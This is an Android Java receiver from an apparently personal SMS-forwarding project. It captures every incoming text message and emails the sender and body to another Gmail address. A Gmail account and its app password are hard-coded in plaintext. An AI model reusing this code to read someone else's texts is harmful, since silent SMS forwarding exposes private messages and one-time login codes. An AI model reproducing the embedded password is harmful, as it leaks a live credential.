package com.example.smsfoword;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {

            Toast.makeText(context, "SMS Received Triggered", Toast.LENGTH_LONG).show();
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                String format = bundle.getString("format");
                if (pdus != null) {
                    StringBuilder smsBody = new StringBuilder();
                    String senderNumber = "";

                    for (Object pdu : pdus) {
                        SmsMessage sms;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                        } else {
                            sms = SmsMessage.createFromPdu((byte[]) pdu);
                        }
                        senderNumber = sms.getDisplayOriginatingAddress();
                        smsBody.append(sms.getMessageBody());
                    }

                    Log.d(TAG, "SMS received from: " + senderNumber + " message: " + smsBody);

                    // Prepare email details
                    String subject = "New SMS from " + senderNumber;
                    String body = smsBody.toString();

                    // Your Gmail credentials (use app password if 2FA enabled)
                    String yourEmail = "sanjaydas205490@gmail.com";
                    String yourAppPassword = "sncatefznjsdeemy";

                    // Recipient email address (where to forward SMS)
                    String recipientEmail = "minhaj42088@gmail.com";

                    // Create sender and send email asynchronously
                    GMailSender mailSender = new GMailSender(yourEmail, yourAppPassword);
                    mailSender.sendMailAsync(subject, body, yourEmail, recipientEmail);
                }
            }
        }
    }
}
